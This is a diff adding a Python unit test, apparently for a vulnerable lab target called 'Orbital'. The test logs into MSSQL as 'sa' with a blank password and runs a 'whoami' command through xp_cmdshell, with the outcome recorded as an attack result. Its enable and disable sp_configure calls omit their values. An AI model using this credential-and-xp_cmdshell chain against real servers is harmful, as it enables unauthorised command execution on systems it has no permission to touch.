@@ -104,3 +104,37 @@ class TestOrbital(unittest.TestCase):
         except Exception as e:
             result = AttackResult(success=False, message=f"Failed to connect to MSSQL with blank sa password: {str(e)}")
             self.assertTrue(result.success, msg=result.message)
+
+    # test if we can use xp_cmdshell to execute commands
+    def test_3_orbital_mssql_xp_cmdshell(self):
+        try:
+            conn = pymssql.connect(
+                server=self.orbital_target_ip,
+                user='sa',
+                password='',
+                database='',
+                port=1433,
+                timeout=10
+            )
+            cursor = conn.cursor()
+            # Enable xp_cmdshell
+            cursor.execute("EXEC sp_configure 'show advanced options'")
+            cursor.execute("EXEC sp_configure 'xp_cmdshell'")
+            # Execute a simple command
+            cursor.execute("EXEC xp_cmdshell 'whoami'")
+            result_row = cursor.fetchone()
+
+            # disable xp_cmdshell again
+            cursor.execute("EXEC sp_configure 'xp_cmdshell'")
+            cursor.execute("EXEC sp_configure 'show advanced options'")
+            conn.close()
+
+            if result_row and result_row[0]:
+                result = AttackResult(success=True, message=f"xp_cmdshell executed successfully, output: {result_row[0]}")
+            else:
+                result = AttackResult(success=False, message="xp_cmdshell did not return any output.")
+            self.assertTrue(result.success, msg=result.message)
+
+        except Exception as e:
+            result = AttackResult(success=False, message=f"Failed to execute xp_cmdshell: {str(e)}")
+            self.assertTrue(result.success, msg=result.message)
